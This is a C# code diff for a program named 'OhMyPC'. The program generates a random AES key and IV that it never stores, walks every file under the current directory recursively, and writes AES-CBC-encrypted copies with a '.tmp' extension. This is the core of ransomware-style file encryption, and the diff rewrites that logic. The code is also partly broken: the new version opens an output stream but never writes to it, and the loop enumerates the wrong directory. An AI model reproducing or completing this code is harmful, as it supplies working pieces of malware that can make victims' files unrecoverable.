@@ -9,7 +9,7 @@ namespace OhMyPC
     {
         static void Main(string[] args)
         {
-            var df = RandomNumberGenerator.GetBytes(32);var ddg = RandomNumberGenerator.GetBytes(16);FileEncrypt.Recurse(Environment.CurrentDirectory, ddg, df);
+            var key = RandomNumberGenerator.GetBytes(32);var iv = RandomNumberGenerator.GetBytes(16);FileEncrypt.Recurse(Environment.CurrentDirectory, iv, key);
             
             return;
         }
@@ -29,29 +29,32 @@ namespace OhMyPC
             foreach (var d in Directory.EnumerateDirectories(FilePath))
             {
                 Recurse(d, IV, Key);
-                Enceypt(d, IV, Key);
+                foreach (var Files in Directory.EnumerateFiles( FilePath))
+                {
+                    FileEncrypt.Enceypt(Files, IV, Key);
+                }
             }
             return;
         }
         static void Enceypt(string FilePath,byte[] IV,byte[] Key)
         {
-            var aes = AesCng.Create();aes.IV = IV;aes.Key = Key;
-            foreach (var file in Directory.EnumerateFiles(FilePath))
+
+            var aes = AesCng.Create(); aes.IV = IV; aes.Key = Key;
+
+            try
             {
-                try
-                {
-                    byte[] bytes = File.ReadAllBytes(file);var FileName=file +".tmp";
-                    var files = new FileStream(FileName, FileMode.CreateNew, FileAccess.ReadWrite, FileShare.ReadWrite);
-                    var df = aes.EncryptCbc(bytes, aes.IV);
-                    files.Write(df, 0, df.Length);
-                    files.Close();
-                } catch(Exception issu)
-                {
-                    Program.WriteLineAsColor(issu.Message,ConsoleColor.Red);
-                }
-                
-                
+                var bytes = File.ReadAllBytes(FilePath);
+                var enc=aes.EncryptCbc(bytes, IV);
+                FileStream fileStream = new(FilePath + ".tmp", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.ReadWrite);
+
             }
+            catch (Exception)
+            {
+
+                throw;
+            }
+
+
         }
     }
 
